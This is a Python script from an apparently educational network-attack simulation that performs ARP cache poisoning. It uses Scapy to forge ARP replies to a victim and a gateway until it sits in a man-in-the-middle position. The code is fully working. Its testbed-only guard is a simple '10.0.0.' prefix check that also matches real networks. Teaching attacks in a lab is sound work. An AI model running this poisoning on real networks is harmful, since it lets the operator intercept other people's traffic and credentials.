#!/usr/bin/env python3
"""
arp_spoof.py  --  the actual ARP spoofing tool (part of Stage 5).

This file is meant to be run ON the attacker host, by simulate_attack.py.
You generally won't run this one directly -- see simulate_attack.py for
the script that sets everything up and launches this automatically.

HOW ARP SPOOFING WORKS (the idea, in plain terms)
-----------------------------------------------------
Every computer keeps a little address book (its "ARP cache") mapping
IP addresses to MAC addresses, e.g. "10.0.0.1 lives at MAC aa:bb:...".
Normally that address book is filled in honestly, by asking "who has
this IP?" and trusting the real owner's reply (that's Stage 4).

The problem: ARP has NO authentication. Nothing stops a machine from
sending an unsolicited "reply" claiming to be an IP it doesn't actually
own. If it does, and the victim believes it (most OSes do, by default),
the victim's address book now has a wrong entry -- it will send traffic
meant for that IP to the attacker's MAC address instead. That's an
ARP-spoofing / cache-poisoning attack.

WHAT THIS SCRIPT DOES
------------------------
It repeatedly sends two forged ("gratuitous") ARP replies:

  1. To the VICTIM, claiming:  "the GATEWAY's IP lives at MY (attacker) MAC"
  2. To the GATEWAY, claiming: "the VICTIM's IP lives at MY (attacker) MAC"

Doing both sides is the classic "man-in-the-middle" position: now every
packet the victim sends toward the gateway, and every reply the gateway
sends back toward the victim, physically passes through the attacker
first. It's sent on a repeating timer because a real ARP cache entry can
expire or get refreshed back to the correct value, so a real attacker
(and therefore our simulation) has to keep re-poisoning it.

SAFETY GUARDRAIL
-------------------
This only runs against IPs inside the 10.0.0.0/24 testbed subnet that
topology.py creates. It refuses to run against anything else, so it
can't be pointed at a real network by mistake.
"""

import argparse
import re
import subprocess
import sys
import time

from scapy.all import ARP, Ether, get_if_hwaddr, sendp

TESTBED_SUBNET = "10.0.0."   # matches net_builder.py's HOSTS
MAC_PATTERN = re.compile(r"\[([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})\]")


def resolve_mac(iface, ip):
    """Finds the real MAC address for an IP using 'arping' (the same
    proven-reliable tool Stage 4 already uses), rather than Scapy's own
    built-in resolver. Scapy's send side (used below to forge packets) is
    solid, but its receive side has been flaky in testing -- arping avoids
    that entirely for this one step and still gets us a trustworthy answer."""
    result = subprocess.run(
        ["arping", "-c", "1", "-w", "1", "-f", "-I", iface, ip],
        capture_output=True, text=True,
    )
    match = MAC_PATTERN.search(result.stdout)
    return match.group(1) if match else None


def guard_testbed_only(ip, label):
    if not ip.startswith(TESTBED_SUBNET):
        print(f"REFUSING: {label} IP {ip} is outside the {TESTBED_SUBNET}0/24 "
              f"testbed subnet. This tool only runs against our own virtual LAN.")
        sys.exit(1)


def build_forged_reply(attacker_mac, spoofed_ip, target_ip, target_mac):
    """One forged ARP packet: 'spoofed_ip lives at attacker_mac', sent
    straight at target_mac so only the intended victim is fooled."""
    return (
        Ether(dst=target_mac, src=attacker_mac)
        / ARP(
            op=2,                  # 2 = "is-at" (a reply), the forgeable part
            psrc=spoofed_ip,       # the IP we're lying about owning
            hwsrc=attacker_mac,    # our real MAC -- this is the actual lie
            pdst=target_ip,        # who we're lying to
            hwdst=target_mac,
        )
    )


def poison_once(iface, attacker_mac, victim_ip, victim_mac, gateway_ip, gateway_mac):
    # Tell the victim: "the gateway is at my MAC"
    sendp(build_forged_reply(attacker_mac, gateway_ip, victim_ip, victim_mac),
          iface=iface, verbose=False)
    # Tell the gateway: "the victim is at my MAC"
    sendp(build_forged_reply(attacker_mac, victim_ip, gateway_ip, gateway_mac),
          iface=iface, verbose=False)


def run(iface, victim_ip, gateway_ip, interval, duration):
    guard_testbed_only(victim_ip, "victim")
    guard_testbed_only(gateway_ip, "gateway")

    attacker_mac = get_if_hwaddr(iface)
    print(f"[arp_spoof] attacker MAC on {iface} is {attacker_mac}")

    print(f"[arp_spoof] resolving real MAC addresses (one honest ARP request each)...")
    victim_mac = resolve_mac(iface, victim_ip)
    gateway_mac = resolve_mac(iface, gateway_ip)
    if not victim_mac or not gateway_mac:
        print("[arp_spoof] ERROR: could not resolve one of the real MAC addresses "
              "(arping got no reply). Is the target host actually up? "
              "Try 'sudo mn -c' and re-run.")
        sys.exit(1)
    print(f"[arp_spoof] victim {victim_ip} is really at {victim_mac}")
    print(f"[arp_spoof] gateway {gateway_ip} is really at {gateway_mac}")

    print(f"[arp_spoof] poisoning every {interval}s for {duration}s "
          f"(victim <-> gateway, via attacker {attacker_mac})")
    end_time = time.time() + duration
    rounds = 0
    while time.time() < end_time:
        poison_once(iface, attacker_mac, victim_ip, victim_mac, gateway_ip, gateway_mac)
        rounds += 1
        time.sleep(interval)

    print(f"[arp_spoof] done. Sent {rounds} rounds of forged ARP replies.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--iface", required=True, help="attacker's network interface, e.g. h4-eth0")
    parser.add_argument("--victim-ip", required=True)
    parser.add_argument("--gateway-ip", required=True)
    parser.add_argument("--interval", type=float, default=2.0,
                         help="seconds between re-poisoning rounds (default: 2)")
    parser.add_argument("--duration", type=float, default=30.0,
                         help="total seconds to keep attacking (default: 30)")
    args = parser.parse_args()
    run(args.iface, args.victim_ip, args.gateway_ip, args.interval, args.duration)